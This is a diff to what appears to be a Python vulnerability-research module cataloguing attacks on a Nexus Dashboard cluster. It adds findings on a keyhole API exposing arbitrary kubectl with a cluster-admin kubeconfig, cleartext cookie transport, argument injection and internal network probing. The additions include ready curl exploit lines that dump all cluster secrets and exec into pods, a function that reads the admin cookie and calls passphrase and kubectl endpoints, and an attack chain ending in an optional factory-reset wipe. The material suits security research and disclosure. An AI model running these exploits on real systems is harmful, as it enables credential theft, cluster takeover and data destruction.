@@ -27,7 +27,7 @@ Container stack (atomix.yaml, 20 core + 200+ app containers):
   apps/cisco-ndfc: 32 NDFC (fabric controller) services
   apps/cisco-nir: 60+ NIR telemetry analysis services
 
-Findings: ND-F01 (CRITICAL) through ND-F42 (HIGH). 12 attack chains.
+Findings: ND-F01 (CRITICAL) through ND-F46 (MEDIUM). 13 attack chains.
 """
 
 import socket
@@ -63,13 +63,19 @@ FINDINGS = {
         "exposed_endpoints": [
             "GET /keyhole/api/v1/passphrase — returns SSH passphrase from /data/services/issh/token/passphrase",
             "GET /keyhole/api/v1/dbgtoken — returns debug challenge token",
+            "GET /keyhole/api/v1/kubectl?args=<kubectl_args> — arbitrary kubectl with rescue-user cluster-admin kubeconfig (ND-F43)",
             "GET /keyhole/api/v1/reboot/<option> — reboots node (regular/clean/factory-reset)",
             "GET /keyhole/api/v1/shutdown — shuts down node",
             "GET /keyhole/api/v1/system-config — returns syscfg.yaml (node topology, minus admin_passwd)",
             "GET /keyhole/api/v1/show/cluster/json — K8s cluster node list",
             "GET /keyhole/api/v1/kafka/... — Kafka consumer group cleanup",
             "GET /keyhole/api/v1/techsupport — collect/clean tech support bundles",
+            "GET /keyhole/api/v1/upgrade/update?filepath=&peer_password= — firmware update with arg injection (ND-F45)",
+            "GET /keyhole/api/v1/ping?args= — unrestricted ICMP from ND node position (ND-F46)",
         ],
+        "source_confirmed": "keyhole_server.py: writeAdminCookie() uses SystemRandom().choices(string.ascii_uppercase, k=15); os.chmod(ADMIN_COOKIE, 0o644)",
+        "server_port": 30020,
+        "server_tls": False,
         "lateral_path": (
             "Container escape OR any mounted host volume read -> cat /var/run/admin.cookie "
             "-> call /keyhole/api/v1/passphrase -> SSH passphrase for node "
@@ -1302,6 +1308,123 @@ FINDINGS = {
         "chain": "Node/container access -> read /data/services/k8_secure/staging/known_tokens.csv -> static K8s bearer token -> k8s API as whatever user is in the CSV",
         "combined_with": ["ND-F01", "ND-F30"],
     },
+    "ND-F43": {
+        "title": "Keyhole /kubectl Endpoint — Arbitrary kubectl with rescue-user Cluster-Admin Kubeconfig",
+        "severity": "CRITICAL",
+        "component": "keyhole_server.py do_kubectl(), /home/rescue-user/.kube/config",
+        "description": (
+            "The /keyhole/api/v1/kubectl endpoint takes a user-controlled args query parameter, "
+            "URL-decodes it, splits on space, and executes kubectl with the result appended to "
+            "--kubeconfig /home/rescue-user/.kube/config. "
+            "rescue-user is the K8s disaster recovery account; its kubeconfig is expected to have "
+            "cluster-admin equivalent privileges for node-level cluster recovery operations. "
+            "Source (keyhole_server.py do_kubectl()): "
+            "quoted_args = flask.request.args.get('args'); "
+            "args = urllib.parse.unquote(quoted_args).split(' '); "
+            "# if '--' in args: insert --kubeconfig RESCUE_USER_CONFIG before '--'; else append; "
+            "return _run_streaming(passwd.KUBECTL_PATH, args) "
+            "No argument validation — attacker can specify any kubectl subcommand: "
+            "get secrets -A (dump all secrets cluster-wide), "
+            "exec (container exec if exec permission exists), "
+            "delete (destroy resources). "
+            "_run_streaming() uses shell=False, preventing shell injection, but full kubectl API access remains. "
+            "Additional: attacker can inject --kubeconfig /attacker/path before -- separator "
+            "to override the rescue-user kubeconfig with an attacker-controlled one."
+        ),
+        "endpoint": "GET /keyhole/api/v1/kubectl?args=<kubectl_args>&cookie=<cookie>",
+        "kubeconfig": "/home/rescue-user/.kube/config",
+        "exploit": (
+            "COOKIE=$(cat /var/run/admin.cookie)\n"
+            "# dump all cluster secrets\n"
+            "curl 'http://localhost:30020/keyhole/api/v1/kubectl?args=get%20secrets%20-A%20-o%20json&cookie='$COOKIE\n"
+            "# exec into pod\n"
+            "curl 'http://localhost:30020/keyhole/api/v1/kubectl?args=exec%20-n%20kube-system%20<pod>%20--%20id&cookie='$COOKIE"
+        ),
+        "impact": "Arbitrary kubectl with cluster-admin equivalent = full K8s cluster takeover",
+        "chain": "ND-F01 (read /var/run/admin.cookie) -> GET /keyhole/api/v1/kubectl?args=get%20secrets%20-A -> cluster-admin",
+        "combined_with": ["ND-F01", "ND-F30"],
+    },
+    "ND-F44": {
+        "title": "Keyhole Server Plain HTTP — Cookie and Credentials Transmitted Unencrypted on Port 30020",
+        "severity": "HIGH",
+        "component": "keyhole_server.py startup: app.run(port=30020, threaded=True)",
+        "description": (
+            "The keyhole Flask server starts with app.run(port=30020, threaded=True) — no ssl_context "
+            "parameter. All traffic including the authentication cookie (URL query param ?cookie=<val>) "
+            "and all command output (kubectl results, passphrase values, cluster config) "
+            "is transmitted in cleartext HTTP. "
+            "Any network path observer between the calling client and the keyhole service can "
+            "capture the cookie passively, then replay it for full keyhole API access. "
+            "In an ND cluster, intra-node management traffic traverses the same network fabric as "
+            "cluster control plane traffic — passive sniffing requires only a position on the "
+            "management VLAN or the ability to capture on a shared interface. "
+            "The cookie is in the HTTP request line (URL query param) — visible in proxy logs, "
+            "tcpdump, and any HTTP-aware logging on the path."
+        ),
+        "port": 30020,
+        "protocol": "HTTP (no TLS)",
+        "auth_vector": "URL query param ?cookie=<val> transmitted in cleartext request line",
+        "impact": "Passive cookie capture from management network position -> full keyhole API access",
+        "chain": "Network sniff /keyhole/api/v1/* request -> extract ?cookie= value -> replay for cluster-admin kubectl (ND-F43)",
+        "combined_with": ["ND-F01", "ND-F43"],
+    },
+    "ND-F45": {
+        "title": "Keyhole Multi-Endpoint Argument Injection — filepath/peer_password/stage/node Unsanitized to subprocess",
+        "severity": "HIGH",
+        "component": "keyhole_server.py upgrade_update(), upgrade_recover(), failover(), rma(), nodejoin()",
+        "description": (
+            "Five keyhole endpoints construct subprocess commands by directly interpolating "
+            "user-controlled query parameters via Python f-strings, then splitting on whitespace "
+            "(subprocess.Popen(str(arg).split(), ...)) — no shell=True, but whitespace in params "
+            "injects extra arguments to the target binary. "
+            "1. /upgrade/update: f'{UPDATE} {filepath} admin {peer_password}' — "
+            "   spaces in filepath or peer_password inject flags to upgrade-helper firmware-update. "
+            "   peer_password hidden from logging (showCmd=False) but not from injection. "
+            "2. /upgrade/recover: f'{RECOVER} {stage}' — stage param injects flags to upgrade-helper recover. "
+            "3. /failover: f'recover failover --failedNode {failedNode} --standbyNode {standbyNode}' — "
+            "   both params injected to recover binary. "
+            "4. /rma: controllerIP + controllerUser + failedNode injected to recover rma. "
+            "5. /nodejoin: passphrase passed as argv[1] to se-join.py — visible in /proc/<pid>/cmdline "
+            "   to any local process during the window se-join.py executes."
+        ),
+        "endpoints": {
+            "/keyhole/api/v1/upgrade/update": "filepath + peer_password -> upgrade-helper firmware-update",
+            "/keyhole/api/v1/upgrade/recover": "stage -> upgrade-helper recover",
+            "/keyhole/api/v1/failover": "failedNode + standbyNode -> recover failover",
+            "/keyhole/api/v1/rma": "controllerIP + controllerUser + controllerPassword -> recover rma",
+            "/keyhole/api/v1/nodejoin": "passphrase -> se-join.py argv[1] (process list visible)",
+        },
+        "injection_mechanism": "f-string whitespace splitting -> extra flags to target binaries; no shell injection",
+        "impact": "Argument injection to upgrade-helper/recover binaries; passphrase process list disclosure",
+        "chain": "ND-F01 cookie -> /upgrade/update?filepath=/fw%20--extra-flag -> injected argument to upgrade-helper",
+        "combined_with": ["ND-F01"],
+    },
+    "ND-F46": {
+        "title": "Keyhole /ping and /nslookup — Unrestricted Internal Network Probing from ND Node Position",
+        "severity": "MEDIUM",
+        "component": "keyhole_server.py do_ping(), do_nslookup(), /keyhole/api/v1/ping + /nslookup",
+        "description": (
+            "The /keyhole/api/v1/ping endpoint URL-decodes and splits user-supplied args, "
+            "then passes them directly to the ping binary with no argument filtering: "
+            "args = urllib.parse.unquote(quoted_args).split(' '); _run_streaming('ping', args). "
+            "This enables an authenticated keyhole caller to probe any IP address for reachability "
+            "from the ND node network position — ICMP from the fabric management network. "
+            "The ND node has direct reach to: Nexus switch management interfaces, OOB management "
+            "subnets, adjacent data center segments, and OT/ICS networks in fabric deployments. "
+            "The /nslookup endpoint similarly passes args to nslookup run as nobody — "
+            "DNS-based internal enumeration from the ND node resolver position. "
+            "Combined with ND-F01 (world-readable cookie), both endpoints are accessible to any "
+            "local process or pod with /var/run/ hostPath mount."
+        ),
+        "endpoints": {
+            "/keyhole/api/v1/ping": "ping with user args (no filter) — ICMP from ND mgmt network",
+            "/keyhole/api/v1/nslookup": "nslookup as nobody with user args — DNS from ND resolver",
+        },
+        "pivot_reach": "Nexus switch mgmt, OOB mgmt subnets, fabric-adjacent segments, OT/ICS networks",
+        "impact": "Internal network reachability mapping from ND fabric node position",
+        "chain": "ND-F01 cookie -> GET /keyhole/api/v1/ping?args=-c1%20<internal_target> -> ICMP probe from ND node",
+        "combined_with": ["ND-F01"],
+    },
     "ND-F40": {
         "title": "system:eventmonitoring ClusterRole — Cluster-Admin Equivalent RBAC on Event Monitoring Service",
         "severity": "CRITICAL",
@@ -2147,6 +2270,59 @@ def probe_ndfc_lanconfig_creds(host: str, jwt_token: str, port: int = 443) -> di
     return result
 
 
+def probe_keyhole_cookie_auth(host: str = "127.0.0.1", port: int = 30020) -> dict:
+    """ND-F43/F44/F45: Test keyhole cookie authentication and enumerate accessible endpoints.
+    Reads /var/run/admin.cookie if present (local execution), then probes key endpoints.
+    """
+    import urllib.request
+    import urllib.error
+
+    result = {
+        "finding": "ND-F01+ND-F43",
+        "host": host,
+        "port": port,
+        "cookie_path": "/var/run/admin.cookie",
+        "cookie_readable": False,
+        "cookie_value": None,
+        "endpoints_tested": {},
+        "kubectl_accessible": False,
+        "passphrase_accessible": False,
+    }
+
+    try:
+        with open("/var/run/admin.cookie", "r") as f:
+            result["cookie_value"] = f.readline().strip()
+            result["cookie_readable"] = True
+    except (PermissionError, FileNotFoundError):
+        result["cookie_readable"] = False
+        return result
+
+    base = f"http://{host}:{port}/keyhole/api/v1"
+    cookie = result["cookie_value"]
+
+    probe_endpoints = [
+        ("version", f"{base}/version?cookie={cookie}"),
+        ("passphrase", f"{base}/passphrase?cookie={cookie}"),
+        ("system-config", f"{base}/system-config?cookie={cookie}"),
+        ("kubectl-get-ns", f"{base}/kubectl?args=get%20namespaces&cookie={cookie}"),
+    ]
+
+    for label, url in probe_endpoints:
+        try:
+            req = urllib.request.Request(url)
+            with urllib.request.urlopen(req, timeout=5) as resp:
+                body = resp.read().decode()[:1000]
+                result["endpoints_tested"][label] = {"status": resp.status, "body": body}
+        except urllib.error.HTTPError as e:
+            result["endpoints_tested"][label] = {"status": e.code, "error": e.reason}
+        except Exception as e:
+            result["endpoints_tested"][label] = {"error": str(e)[:120]}
+
+    result["kubectl_accessible"] = result["endpoints_tested"].get("kubectl-get-ns", {}).get("status") == 200
+    result["passphrase_accessible"] = result["endpoints_tested"].get("passphrase", {}).get("status") == 200
+    return result
+
+
 # ─── Attack Chain Summary ────────────────────────────────────────────────────
 
 
@@ -2293,6 +2469,29 @@ ATTACK_CHAINS = {
         ],
         "entry_requirement": "ND-F01 world-readable cookie OR ND-F03 etcd noauth OR container escape",
         "findings": ["ND-F25", "ND-F01", "ND-F03", "ND-F27"],
+    },
+    "chain_13_keyhole_cookie_kubectl_cluster_takeover": {
+        "title": "Keyhole World-Readable Cookie -> Arbitrary kubectl -> Cluster Takeover",
+        "entry_requirement": "Local process execution on any ND cluster node (any user)",
+        "steps": [
+            "1. Read /var/run/admin.cookie (0644 world-readable): COOKIE=$(cat /var/run/admin.cookie)",
+            "2. GET http://localhost:30020/keyhole/api/v1/kubectl?args=get%20secrets%20-A%20-o%20json&cookie=$COOKIE",
+            "   -> kubectl runs with /home/rescue-user/.kube/config (cluster-admin kubeconfig, ND-F43)",
+            "   -> dumps all K8s secrets cluster-wide including kube-system service account tokens",
+            "3. Extract kube-system admin token from response",
+            "4. Full cluster-admin K8s API access",
+            "5. OPTIONAL: GET /keyhole/api/v1/passphrase?cookie=$COOKIE -> issh passphrase for SSH lateral movement (ND-F02)",
+            "6. OPTIONAL: GET /keyhole/api/v1/reboot/factory-reset?cookie=$COOKIE -> destructive cluster wipe",
+            "7. OPTIONAL: Network path -> sniff port 30020 traffic -> steal cookie in transit (ND-F44)",
+        ],
+        "findings": ["ND-F01", "ND-F43", "ND-F02"],
+        "severity": "CRITICAL",
+        "no_privileges_required": True,
+        "note": (
+            "Entry requirement is any code execution on the ND node — achievable via ND-F01 "
+            "techsupport bundle RCE path, ND-F29 Zot image poisoning, or ND-F30 cluster-admin SA token. "
+            "Chain is also accessible via ND-F44 (network sniffing, no local access needed)."
+        ),
     },
     "chain_11_zot_image_poison_cluster_takeover": {
         "title": "Zot No-Auth Registry Image Push -> Pod Code Exec -> Cluster-Admin SA Token -> Cluster Takeover",
